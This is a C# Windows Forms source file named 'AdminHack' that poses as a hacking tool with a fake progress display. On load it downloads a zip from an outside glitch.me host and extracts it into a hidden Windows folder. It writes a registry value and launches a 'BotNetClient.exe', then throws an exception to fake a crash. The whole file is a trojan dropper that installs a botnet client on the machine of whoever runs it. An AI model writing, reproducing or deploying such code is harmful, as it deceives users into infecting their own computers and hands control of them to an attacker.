using System;
using System.IO.Compression;
using System.IO;
using System.Threading.Tasks;
using System.Net.Http;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;

namespace AdminHack
{
    public partial class Form1 : Form
    {
        private static void admin (string path)
        {
            try
            {
                RegistryKey reg;
                reg = Registry.CurrentUser.CreateSubKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags");
                reg.SetValue("systems", path);
            }
            catch { }
        }
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Zip();
        }
        private async void Log()
        {
            await Task.Run(()=>
            {
                string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);

                Thread.Sleep(3000);
                label4.Text += "\nForm submission";
                progressBar1.Value += 25;
                Thread.Sleep(3000);
                label4.Text += "\nHacking in progress...";
                progressBar1.Value += 45;
                Thread.Sleep(4000);
                label4.Text += "\nUnknown error...";
                admin(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
                Process.Start(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
                Thread.Sleep(5000);
                throw new Exception();
            });
        }
        private async Task<byte[]> GetZip()
        {
            try
            {
                HttpClient client = new HttpClient();
                client.BaseAddress = new Uri(@"https://mineweb-hackserever.glitch.me/");
                HttpResponseMessage resp = client.GetAsync("/scripts/prescorenet.zip").Result;
                byte[] bt = await resp.Content.ReadAsAsync<byte[]>();
                return bt;
            }
            catch (Exception)
            {
                throw;
            }
        }
        private async void Zip()
        {
                byte[] bt = GetZip().Result;
            string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);

            if (File.Exists(diskname[0] + "\\Windows\\ClientDir\\BotNetClient.exe"))
            {
                if (!File.Exists(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip"))
                {
                    File.WriteAllBytes(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", bt);
                    DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                    ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
                    File.Delete(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip");

                }
                else
                {
                    DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                    ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
                    File.Delete(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip");
                }
            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = "received";
            textBox2.Text = "received";
        }

        private void progressBar1_Click(object sender, EventArgs e)
        {
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "received" && textBox2.Text == "received" && textBox3.Text != null)
            {
                label4.Text = "Starting...";
                progressBar1.Value = 0;
                progressBar1.Value += 1;
                Log();
            }
            else
            {
                label4.Text = "Check the entered data...";
            }
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }
    }
    public class Product
    {
        public byte[] archive { get; set; }
    }
}
